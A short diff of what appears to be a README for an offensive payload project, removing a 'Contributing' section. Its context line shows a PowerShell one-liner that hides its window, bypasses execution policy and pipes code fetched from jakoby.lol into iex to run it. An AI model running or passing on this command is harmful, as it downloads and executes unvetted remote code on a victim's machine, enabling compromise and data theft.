@@ -71,14 +71,6 @@ powershell -w h -NoP -Ep Bypass $dc='';$db='';irm jakoby.lol/9nb | iex
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
-## Contributing
-
-All contributors names will be listed here
-
-I am Jakoby
-
-<p align="right">(<a href="#top">back to top</a>)</p>
-
 ## Version History
 
 * 0.1
